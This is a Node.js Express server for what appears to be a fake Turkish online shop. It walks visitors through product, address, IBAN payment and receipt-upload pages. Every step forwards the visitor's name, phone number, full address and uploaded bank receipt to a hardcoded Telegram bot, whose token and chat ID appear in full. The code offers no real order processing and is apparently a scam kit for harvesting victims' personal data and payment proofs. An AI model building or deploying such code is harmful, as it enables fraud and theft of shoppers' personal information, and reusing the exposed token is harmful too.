var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');

var FormData = require('form-data');

var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'twig');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

const tg = {
  chatId: -911957440,
  token: "6003510614:AAEt5-frsbPyyLEdHVNy_JYqUQ6zTc1wtiY",
  cities: [
    {
        "value": "İstanbul",
        "key": "34"
    },
    {
        "value": "Ankara",
        "key": "6"
    },
    {
        "value": "İzmir",
        "key": "35"
    },
    {
        "value": "Adana",
        "key": "1"
    },
    {
        "value": "Adıyaman",
        "key": "2"
    },
    {
        "value": "Afyonkarahisar",
        "key": "3"
    },
    {
        "value": "Ağrı",
        "key": "4"
    },
    {
        "value": "Aksaray",
        "key": "68"
    },
    {
        "value": "Amasya",
        "key": "5"
    },
    {
        "value": "Antalya",
        "key": "7"
    },
    {
        "value": "Ardahan",
        "key": "75"
    },
    {
        "value": "Artvin",
        "key": "8"
    },
    {
        "value": "Aydın",
        "key": "9"
    },
    {
        "value": "Balıkesir",
        "key": "10"
    },
    {
        "value": "Bartın",
        "key": "74"
    },
    {
        "value": "Batman",
        "key": "72"
    },
    {
        "value": "Bayburt",
        "key": "69"
    },
    {
        "value": "Bilecik",
        "key": "11"
    },
    {
        "value": "Bingöl",
        "key": "12"
    },
    {
        "value": "Bitlis",
        "key": "13"
    },
    {
        "value": "Bolu",
        "key": "14"
    },
    {
        "value": "Burdur",
        "key": "15"
    },
    {
        "value": "Bursa",
        "key": "16"
    },
    {
        "value": "Çanakkale",
        "key": "17"
    },
    {
        "value": "Çankırı",
        "key": "18"
    },
    {
        "value": "Çorum",
        "key": "19"
    },
    {
        "value": "Denizli",
        "key": "20"
    },
    {
        "value": "Diyarbakır",
        "key": "21"
    },
    {
        "value": "Düzce",
        "key": "81"
    },
    {
        "value": "Edirne",
        "key": "22"
    },
    {
        "value": "Elazığ",
        "key": "23"
    },
    {
        "value": "Erzincan",
        "key": "24"
    },
    {
        "value": "Erzurum",
        "key": "25"
    },
    {
        "value": "Eskişehir",
        "key": "26"
    },
    {
        "value": "Gaziantep",
        "key": "27"
    },
    {
        "value": "Giresun",
        "key": "28"
    },
    {
        "value": "Gümüşhane",
        "key": "29"
    },
    {
        "value": "Hakkari",
        "key": "30"
    },
    {
        "value": "Hatay",
        "key": "31"
    },
    {
        "value": "Iğdır",
        "key": "76"
    },
    {
        "value": "Isparta",
        "key": "32"
    },
    {
        "value": "Kahramanmaraş",
        "key": "46"
    },
    {
        "value": "Karabük",
        "key": "78"
    },
    {
        "value": "Karaman",
        "key": "70"
    },
    {
        "value": "Kars",
        "key": "36"
    },
    {
        "value": "Kastamonu",
        "key": "37"
    },
    {
        "value": "Kayseri",
        "key": "38"
    },
    {
        "value": "Kırıkkale",
        "key": "71"
    },
    {
        "value": "Kırklareli",
        "key": "39"
    },
    {
        "value": "Kırşehir",
        "key": "40"
    },
    {
        "value": "Kilis",
        "key": "79"
    },
    {
        "value": "Kocaeli",
        "key": "41"
    },
    {
        "value": "Konya",
        "key": "42"
    },
    {
        "value": "Kütahya",
        "key": "43"
    },
    {
        "value": "Malatya",
        "key": "44"
    },
    {
        "value": "Manisa",
        "key": "45"
    },
    {
        "value": "Mardin",
        "key": "47"
    },
    {
        "value": "Mersin",
        "key": "33"
    },
    {
        "value": "Muğla",
        "key": "48"
    },
    {
        "value": "Muş",
        "key": "49"
    },
    {
        "value": "Nevşehir",
        "key": "50"
    },
    {
        "value": "Niğde",
        "key": "51"
    },
    {
        "value": "Ordu",
        "key": "52"
    },
    {
        "value": "Osmaniye",
        "key": "80"
    },
    {
        "value": "Rize",
        "key": "53"
    },
    {
        "value": "Sakarya",
        "key": "54"
    },
    {
        "value": "Samsun",
        "key": "55"
    },
    {
        "value": "Siirt",
        "key": "56"
    },
    {
        "value": "Sinop",
        "key": "57"
    },
    {
        "value": "Sivas",
        "key": "58"
    },
    {
        "value": "Şanlıurfa",
        "key": "63"
    },
    {
        "value": "Şırnak",
        "key": "73"
    },
    {
        "value": "Tekirdağ",
        "key": "59"
    },
    {
        "value": "Tokat",
        "key": "60"
    },
    {
        "value": "Trabzon",
        "key": "61"
    },
    {
        "value": "Tunceli",
        "key": "62"
    },
    {
        "value": "Uşak",
        "key": "64"
    },
    {
        "value": "Van",
        "key": "65"
    },
    {
        "value": "Yalova",
        "key": "77"
    },
    {
        "value": "Yozgat",
        "key": "66"
    },
    {
        "value": "Zonguldak",
        "key": "67"
    }
  ],
  setAddress: (user) => {
    if (!user) return;
    
    let city = tg.cities.find((city) => city.key == user.sehir).value;
    let address = `Fiyat: ${user.price} TL \n🧑 𝐀𝐝-𝐒𝐨𝐲𝐚𝐝: ${user.name} ${user.surname}\n📞 𝐓𝐞𝐥𝐞𝐟𝐨𝐧: ${user.tel}\n\n${user.addressTitle}: ${city}, ${user.ilce}\n𝐌𝐚𝐡𝐚𝐥𝐥𝐞: ${user.mahalle}\n\n𝐀𝐝𝐫𝐞𝐬: ${user.address}`;

    const data = {
      chat_id: tg.chatId,
      text: address
    };

    const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;

    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    };

    fetch(url, options)
      .then(res => res.json())
      .then(res => {
        
      })
      .catch(err => {
        
      });
  },
  setPage: (user, page) => {
    if (!user) return;

    const data = {
      chat_id: tg.chatId,
      text: `📝 ${user.name} ${user.surname}, ${page} 𝐬𝐚𝐲𝐟𝐚𝐬𝐢𝐧𝐚 𝐠𝐞𝐜𝐭𝐢.`
    };

    const url = `https://api.telegram.org/bot${tg.token}/sendMessage`;

    const options = {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    };

    fetch(url, options)
      .then(res => res.json())
      .then(res => {

      })
      .catch(err => {

      });
  },
  sendFile: (user, filepath) => {
    if (!user) return;

    const data = new FormData();
    data.append("chat_id", tg.chatId);
    data.append("document", createReadStream(filepath));
    data.append('caption', `📝 ${user.name} ${user.surname} adlı kullanıcının dekontu`);


    const url = `https://api.telegram.org/bot${tg.token}/sendDocument?chat_id=${tg.chatId}`;

    axios.post(url, data, {
        headers: {
            ...data.getHeaders()
        }
    })
      .then(res => {
        if (res.status == 200) {
            setTimeout(() => {
                unlinkSync(filepath);
            }, 5000);
        }
      })
      .then(err => {
      })
  }
}


const items = require("./data.json");

app.get('/urunler', function(req, res, next) {
  let item = items.data.items[0];
  item.nameClean = item.name.replace(/ /g, "-");
  item = {
    ...item,
    ...items.data.fixed
  }
  res.render("items", {
      item
  });
});

app.get('/odeme', function(req, res, next) {
  let item = items.data.items[0];
  item.nameClean = item.name.replace(/ /g, "-");
  item = {
    ...item,
    ...items.data.fixed
  }
  res.render("payment", {
      item
  });
});

app.get('/adres', function(req, res, next) {
  let item = items.data.items[0];
  item.nameClean = item.name.replace(/ /g, "-");
  item = {
    ...item,
    ...items.data.fixed
  };

  res.render("address", {
      item
  });
});

app.post('/iban', function(req, res, next) {
  let item = items.data.items[0];
  item.nameClean = item.name.replace(/ /g, "-");
  item = {
    ...item,
    ...items.data.fixed
  }
  
  // user from req.body set to cookie
  let user = {
    name: req.body.isimsor,
    surname: req.body.soysor,
    tel: req.body.telsor,
    price: item.price,
    addressTitle: req.body.adressor,
    address: req.body.addressDetail,
    ilce: req.body.ilcesor,
    mahalle: req.body.mahsor,
    sehir: req.body.city,
  };
  
  let lastUser = req.cookies?.user;

  if (user.name && user.surname && user.tel && user.price && user.addressTitle && user.address && user.ilce && user.mahalle && user.sehir) {
    res.cookie('user', user);

    tg.setAddress(lastUser);
  } else {
    tg.setPage(lastUser, 'ödeme');
  }
  
  res.render("iban", {
      item
  });
});

app.post('/makbuz', function(req, res, next) {
  let item = items.data.items[0];
  item.nameClean = item.name.replace(/ /g, "-");
  item = {
    ...item,
    ...items.data.fixed
  }

  
  
  let lastUser = req.cookies?.user;
  tg.setPage(lastUser, 'makbuz');

  res.render("makbuz", {
      item
  });
});

var multer = require('multer');
const exp = require('constants');
const { createReadStream, unlinkSync } = require('fs');
const { default: axios } = require('axios');
var storage = multer.diskStorage({
  destination: function (req, file, cb) {

      // Uploads is the Upload_folder_name
      cb(null, "uploads")
  },
  filename: function (req, file, cb) {
    cb(null, file.fieldname + "-" + Date.now()+".jpg")
  }
})
     
// Define the maximum size for uploading
// picture i.e. 1 MB. it is optional
const maxSize = 10 * 1000 * 1000;
  
var upload = multer({ 
  storage: storage,
  limits: { fileSize: maxSize },
  fileFilter: function (req, file, cb) {
  
      // Set the filetypes, it is optional
      var filetypes = /jpeg|jpg|png|pdf/;
      var mimetype = filetypes.test(file.mimetype);

      var extname = filetypes.test(path.extname(
                  file.originalname).toLowerCase());
      
      if (mimetype && extname) {
          return cb(null, true);
      }
      
      cb("Error: File upload only supports the "
              + "following filetypes - " + filetypes);
    }
}).single("dekont");

app.post('/tamamlandi', function(req, res, next) {
    let item = items.data.items[0];
    item.nameClean = item.name.replace(/ /g, "-");
    item = {
      ...item,
      ...items.data.fixed
    }

  upload(req,res,function(err) {
  
    if(err) {

        // ERROR occurred (here it can be occurred due
        // to uploading image of size greater than
        // 1MB or uploading different file type)
        res.send(err)
    }
    else {

        let file = req.file;

        let lastUser = req.cookies?.user;

        tg.sendFile(lastUser, file.path);

        // SUCCESS, image successfully uploaded
        res.render("success", {
            item
        });
    }
  })
});

app.get('/hata', function(req, res, next) {
  res.render("error");
});

// catch 404 and forward to error handler
app.use(function(req, res, next) {
  next(createError(404));
});

// error handler
// app.use(function(err, req, res, next) {
//   // set locals, only providing error in development
//   res.locals.message = err.message;
//   res.locals.error = req.app.get('env') === 'development' ? err : {};

//   res.redirect('/hata');
// });

module.exports = app;
